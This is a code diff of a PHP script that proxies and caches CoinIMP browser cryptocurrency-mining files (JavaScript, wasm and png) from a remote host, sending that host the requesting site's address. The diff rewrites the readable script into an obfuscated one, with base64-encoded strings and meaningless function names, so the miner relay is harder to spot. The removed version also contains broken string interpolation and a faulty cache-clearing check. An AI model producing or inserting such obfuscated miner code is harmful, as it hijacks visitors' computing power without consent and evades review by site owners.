@@ -1,114 +1,77 @@
-<?php /* yxorP */
-
-$URL_GET = 'http://www.wasm.stream/';
-$CACHE_TIME = '1 hour';
-$CACHE_FILE = 'coinimp-cache';
-
-function url_get_contents($url)
+<?php $e5 = base64_decode('aHR0cDovL3d3dy53YXNtLnN0cmVhbS8=');
+$h6 = base64_decode('MSBob3Vy');
+$z7 = base64_decode('Y29pbmltcC1jYWNoZQ==');
+function r0($v8)
 {
-    $data = false;
-
-    if (function_exists('curl_exec')) {
-        if ($conn = curl_init($url)) {
-            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
-            curl_setopt($conn, CURLOPT_FRESH_CONNECT, true);
-            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
-            $data = (curl_exec($conn));
-            curl_close($conn);
+    $g9 = false;
+    if (function_exists(base64_decode('Y3VybF9leGVj'))) {
+        if ($na = curl_init($v8)) {
+            curl_setopt($na, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($na, CURLOPT_FRESH_CONNECT, true);
+            curl_setopt($na, CURLOPT_RETURNTRANSFER, 1);
+            $g9 = (curl_exec($na));
+            curl_close($na);
         }
-    } elseif (function_exists('file_get_contents')) {
-        $data = file_get_contents($url);
-    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
-        if ($handle = fopen($url, 'rb')) {
-            $data = stream_get_contents($handle);
+    } elseif (function_exists(base64_decode('ZmlsZV9nZXRfY29udGVudHM='))) {
+        $g9 = file_get_contents($v8);
+    } elseif (function_exists(base64_decode('Zm9wZW4=')) && function_exists(base64_decode('c3RyZWFtX2dldF9jb250ZW50cw=='))) {
+        if ($fb = fopen($v8, base64_decode('cg=='))) {
+            $g9 = stream_get_contents($fb);
         }
     }
-
-    if ($data) {
-        return $data;
-    }
-    else {
-        die('Cannot download \'$url\'!');
-    }
+    if ($g9) return $g9; else die("Cannot download \"$v8\"!");
 }
 
-function get_file_from_server($filename)
+function u1($ic)
 {
-    global $URL_GET;
-    $filename = urlencode($filename);
-    $uri = strtok($_SERVER['REQUEST_URI'], '?');
-    $host = urlencode((isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '$uri');
-    return url_get_contents('$URL_GET?filename=$filename&host=$host');
+    global $e5;
+    $ic = urlencode($ic);
+    $hd = strtok($_SERVER[base64_decode('UkVRVUVTVF9VUkk=')], base64_decode('Pw=='));
+    $te = urlencode((isset($_SERVER[base64_decode('SFRUUFM=')]) ? base64_decode('aHR0cHM=') : base64_decode('aHR0cA==')) . base64_decode('Oi8v') . $_SERVER[base64_decode('SFRUUF9IT1NU')] . "$hd");
+    return r0("$e5?filename=$ic&host=$te");
 }
 
-function filename_match($filename): bool
+function j2($ic)
 {
-    return preg_match('/^\w{4}\.js$/', $filename)
-        || preg_match('/^\w{6}\.js$/', $filename)
-        || preg_match('/^\w{7}\.min\.js\.mem$/', $filename)
-        || preg_match('/^\w{8}\.wasm$/', $filename)
-        || preg_match('/^\w{8}\.png$/', $filename);
+    return preg_match(base64_decode('L15cd3s0fVwuanMkLw=='), $ic) || preg_match(base64_decode('L15cd3s2fVwuanMkLw=='), $ic) || preg_match(base64_decode('L15cd3s3fVwubWluXC5qc1wubWVtJC8='), $ic) || preg_match(base64_decode('L15cd3s4fVwud2FzbSQv'), $ic) || preg_match(base64_decode('L15cd3s4fVwucG5nJC8='), $ic);
 }
 
-function get_CACHE_FILE()
+function w3()
 {
-    $dirs = array('coinimp-cache', 'tmp/coinimp-cache', '/tmp/coinimp-cache');
-    foreach ($dirs as $dir) {
-        if (!file_exists($dir)) {
-            if (!mkdir($dir, 0777, true) && !is_dir($dir)) {
-                $GLOBALS['BUGSNAG']->notifyException(new RuntimeException(sprintf('Directory "%s" was not created', $dir)));
-            }
-        }
-
-        if (is_writable($dir)) {
-            return $dir;
-        }
+    $cf = array(base64_decode('Y29pbmltcC1jYWNoZQ=='), base64_decode('dG1wL2NvaW5pbXAtY2FjaGU='), base64_decode('L3RtcC9jb2luaW1wLWNhY2hl'));
+    foreach ($cf as $p10) {
+        if (!file_exists($p10)) mkdir($p10, 0777, true);
+        if (is_writeable($p10)) return $p10;
     }
-    die('cache directory is not writeable!');
+    die(base64_decode('Q2FjaGUgZGlyZWN0b3J5ICJjb2luaW1wLWNhY2hlIiBpcyBub3Qgd3JpdGVhYmxlIQ=='));
 }
 
-function get_dir_size($path): int
+function f4($v11)
 {
-    $fileSize = 0;
-    $dir = scandir($path);
-
-    foreach ($dir as $file) {
-        if (($file !== '.') && ($file !== '..')) {
-            if (is_dir($path . '/' . $file)) {
-                $fileSize += get_dir_size($path . '/' . $file);
-            } else {
-                $fileSize += filesize($path . '/' . $file);
-            }
-        }
+    $j12 = 0;
+    $p10 = scandir($v11);
+    foreach ($p10 as $u13) {
+        if (($u13 !== base64_decode('Lg==')) && ($u13 !== base64_decode('Li4='))) if (is_dir($v11 . base64_decode('Lw==') . $u13)) $j12 += f4($v11 . base64_decode('Lw==') . $u13); else $j12 += filesize($v11 . base64_decode('Lw==') . $u13);
     }
-
-    return $fileSize;
+    return $j12;
 }
 
-$CACHE_FILE = get_CACHE_FILE();
-
-$req_file = $_GET['f'] ?? '';
-
-if (!filename_match($req_file)) {
-    die('Invalid argument');
+$z7 = w3();
+$q14 = isset($_GET[base64_decode('Zg==')]) ? $_GET[base64_decode('Zg==')] : '';
+if (!j2($q14)) {
+    die(base64_decode('SW52YWxpZCBhcmd1bWVudA=='));
 }
-
-$CACHE_FILEname = '$CACHE_FILE/$req_file';
-if (!file_exists($CACHE_FILEname) || (filemtime($CACHE_FILEname) < strtotime('-$CACHE_TIME'))) {
-    $script = get_file_from_server($req_file);
-    file_put_contents($CACHE_FILEname, $script);
-} elseif (get_dir_size($CACHE_FILE) < 7000000) {
-    rmdir($CACHE_FILE);
-    $script = get_file_from_server($req_file);
-    file_put_contents($CACHE_FILEname, $script);
+$i15 = "$z7/$q14";
+if (!file_exists($i15) || (filemtime($i15) < strtotime("-$h6"))) {
+    $u16 = u1($q14);
+    file_put_contents($i15, $u16);
+} elseif (f4($z7) < 7000000) {
+    rmdir($z7);
+    $u16 = u1($q14);
+    file_put_contents($i15, $u16);
 } else {
-    $script = file_get_contents($CACHE_FILEname);
+    $u16 = file_get_contents($i15);
 }
-
-$type = str_ends_with($req_file, 'js')
-    ? 'application/javascript'
-    : 'application/octet-stream';
-
-header('Content-Type: ' . $type . '; charset=utf-8');
-
-die($script);
+$b17 = substr($q14, -2) == base64_decode('anM=') ? base64_decode('YXBwbGljYXRpb24vamF2YXNjcmlwdA==') : base64_decode('YXBwbGljYXRpb24vb2N0ZXQtc3RyZWFt');
+header(base64_decode('Q29udGVudC1UeXBlOiA=') . $b17 . base64_decode('OyBjaGFyc2V0PXV0Zi04'));
+die($u16); ?>
